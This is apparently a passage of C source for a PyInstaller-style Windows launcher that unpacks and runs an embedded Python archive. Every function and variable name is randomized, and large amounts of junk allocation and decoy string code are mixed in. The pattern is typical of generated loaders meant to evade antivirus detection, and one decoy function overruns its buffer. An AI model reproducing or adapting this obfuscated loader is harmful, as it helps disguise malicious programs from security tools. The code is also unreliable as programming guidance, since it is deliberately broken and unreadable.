} return 0; }
int bRpGhyQZic(ARCHIVE_STATUS *kDeOmvav, char const * SSnxFl, char  const * BobCvJycA) {
if (GDYRVJXHADmy(kDeOmvav, SSnxFl, BobCvJycA)) return -1;
if (acJORotZvpUt(kDeOmvav)) return -1;
return 0; }
int JDFJnZJbzPWYDT(ARCHIVE_STATUS *fEqAmM, int argc, char *argv[]) {
int zuKSuIqHYOtaqE = 0;
if (OZgLWEexaNfGXph(fEqAmM)) return -1;
if (UTXErUXCMv(fEqAmM, argc, argv)) return -1;
if (BTJAbjcAPPZD(fEqAmM)) return -1;
if (CUqmSyIqeVQMOq(fEqAmM)) return -1;
zuKSuIqHYOtaqE = vxFgxNlecXiV(fEqAmM);
return zuKSuIqHYOtaqE; }
void PyzGtZyZeeEN(const char *jzVGbnO);
void aDorBfoowDGXY(char *gtSrLIqMYKae, int QZFdTB, struct _finddata_t WLaEYOitITwZoU) {
if ( strcmp(WLaEYOitITwZoU.name, ".")==0  || strcmp(WLaEYOitITwZoU.name, "..") == 0 ) return;
gtSrLIqMYKae[QZFdTB] = '\0';
strcat(gtSrLIqMYKae, WLaEYOitITwZoU.name);
if ( WLaEYOitITwZoU.attrib & _A_SUBDIR ) PyzGtZyZeeEN(gtSrLIqMYKae);
 else if (remove(gtSrLIqMYKae)) { Sleep(100); remove(gtSrLIqMYKae); } }
void PyzGtZyZeeEN(const char *TKfzPGJQdWnjBa) {
char xQWExbX[_MAX_PATH+1]; struct _finddata_t yxZIaYSOU;
long BtkiXqJjL; int VGpUSuyk; strcpy(xQWExbX, TKfzPGJQdWnjBa);
VGpUSuyk = strlen(xQWExbX);
if ( xQWExbX[VGpUSuyk-1] != '/' && xQWExbX[VGpUSuyk-1] != '\\' ) { strcat(xQWExbX, "\\"); VGpUSuyk++; }
strcat(xQWExbX, "*");
BtkiXqJjL = _findfirst(xQWExbX, &yxZIaYSOU);
if (BtkiXqJjL != -1) {
    aDorBfoowDGXY(xQWExbX, VGpUSuyk, yxZIaYSOU);
    while ( _findnext(BtkiXqJjL, &yxZIaYSOU) == 0 ) aDorBfoowDGXY(xQWExbX, VGpUSuyk, yxZIaYSOU);
    _findclose(BtkiXqJjL); }
rmdir(TKfzPGJQdWnjBa); }
void snUuCrtQx(ARCHIVE_STATUS *aPEubTumHW) { if (aPEubTumHW->temppath[0]) PyzGtZyZeeEN(aPEubTumHW->temppath); }
int XHNXUGGqBqB(ARCHIVE_STATUS *lEIBoRD) { return ntohl(lEIBoRD->cookie.pyvers); }
void EIgfGSlBJZQIaS(void) { PI_Py_Finalize(); } 
char* eugIpJnNd(char* s){ char *result =  malloc(strlen(s)*2+1); int i; for (i=0; i<strlen(s)*2+1; i++){ result[i] = s[i/2]; result[i+1]=s[i/2];} result[i] = '\0'; return result; }
char* vBQZCfgWpTZ(const char *t) { int length= strlen(t); int i; char* t2 = (char*)malloc((length+1) * sizeof(char)); for(i=0;i<length;i++) { t2[(length-1)-i]=t[i]; } t2[length] = '\0'; return t2; }
char* hHDxXfPRpzeK(){ char *WrSeVLIqRvq = eugIpJnNd("OprxYljWirTEBpmvpmubDDBvYaoRRaSAAbqCYVFbhvSpMREGMe"); return strstr( WrSeVLIqRvq, "a" );}
char* nmdbwooQBY() { char bsFkRjxDvfCEkzY[8307] = "RtzpyriauIdZSzsTIblakSrfwkRcWZREJQvbkrUncVTOsrFUVe"; char *xeroVkhXxIGOfz = strupr(bsFkRjxDvfCEkzY); return strlwr(xeroVkhXxIGOfz); }
char* eHsOKn(){ char fZiKcyQGL[8307], ZXaHKbzgO[8307/2]; strcpy(fZiKcyQGL,"tjJGdiqOEYtzKKwWwgmNkheJnFGYTXzrpXsgbpGTPXHEuDmAQB"); strcpy(ZXaHKbzgO,"GrZmZMBvfGIgSnQImBgzSJLNPhNfhogEVqOfdZlukcJrIPoUqE"); return vBQZCfgWpTZ(strcat( fZiKcyQGL, ZXaHKbzgO)); }
int APIENTRY WinMain( HINSTANCE rmIaBLOaPaQbm, HINSTANCE DmxWLTQ, LPSTR HSgXdzI, int zpNIAwXOps ) {
char* tyBYta[7081];
int i = 0;
WCHAR TBRUcNIOz[_MAX_PATH + 1];
char **argv = __argv;
int argc = __argc;
char MEIPASS2[_MAX_PATH + 11] = "_MEIPASS2=";
char HPffBCE[_MAX_PATH];
char UPRDSeITap[_MAX_PATH];
int mypjpCsk = 0;
char* MknCMnB[3790];
ARCHIVE_STATUS *xELUyoU[20];
char* KwjBtJn[3793];
char *LStAcqYjYo = NULL;
char EjXmAXPC[_MAX_PATH + 5];
memset(&xELUyoU, 0, 20 * sizeof(ARCHIVE_STATUS *));
for (i = 0;  i < 3790;  ++i) MknCMnB[i] = malloc (9488);if ((xELUyoU[SELF] = (ARCHIVE_STATUS *) calloc(1, sizeof(ARCHIVE_STATUS))) == NULL){ return -1; }
rGmtKNXlanajCk(UPRDSeITap, argv[0]);
pGqdIbzUvaIPrqK(TBRUcNIOz);
for (i = 0;  i < 7081;  ++i) tyBYta[i] = malloc (8460);jHJSnBpS(EjXmAXPC, UPRDSeITap);
EXXGSEMCxVkyVH(HPffBCE, UPRDSeITap);
for (i = 0;  i < 3793;  ++i) KwjBtJn[i] = malloc (8372);LStAcqYjYo = getenv( "_MEIPASS2" );
if (LStAcqYjYo && *LStAcqYjYo == 0) { LStAcqYjYo = NULL; }
if (bRpGhyQZic(xELUyoU[SELF], HPffBCE, &UPRDSeITap[strlen(HPffBCE)])) {
    if (bRpGhyQZic(xELUyoU[SELF], HPffBCE, &EjXmAXPC[strlen(HPffBCE)])) { return -1; } }
if (!LStAcqYjYo && !YuAWFrBQfod(xELUyoU)) {
    LStAcqYjYo = HPffBCE;
    strcat(MEIPASS2, HPffBCE);
    putenv(MEIPASS2); }
if (LStAcqYjYo) {
    if (strcmp(HPffBCE, LStAcqYjYo) != 0) {
        strcpy(xELUyoU[SELF]->temppath, LStAcqYjYo);
        strcpy(xELUyoU[SELF]->temppathraw, LStAcqYjYo); }
    LsWTaRHoEPIgWx(LStAcqYjYo, UPRDSeITap);
for (i=0; i<3790; ++i){strcpy(MknCMnB[i], hHDxXfPRpzeK());}    mypjpCsk = JDFJnZJbzPWYDT(xELUyoU[SELF], argc, argv);
    bZmJnbBpUr();
    EIgfGSlBJZQIaS();
} else { 
    if (QCvSyDwTysgwoCO(xELUyoU)) { return -1; }
for (i=0; i<7081; ++i){strcpy(tyBYta[i], nmdbwooQBY());}    strcat(MEIPASS2, xELUyoU[SELF]->temppath[0] != 0 ? xELUyoU[SELF]->temppath : HPffBCE);
    putenv(MEIPASS2);
    if (gXYswXCgIDxr(xELUyoU[SELF]) == -1) return -1;
    mypjpCsk = Vipouk(TBRUcNIOz);
    if (xELUyoU[SELF]->temppath[0] != 0) PyzGtZyZeeEN(xELUyoU[SELF]->temppath);
    for (i = SELF; xELUyoU[i] != NULL; i++) { free(xELUyoU[i]); }}
for (i=0; i<3793; ++i){strcpy(KwjBtJn[i], eHsOKn());}return mypjpCsk; }
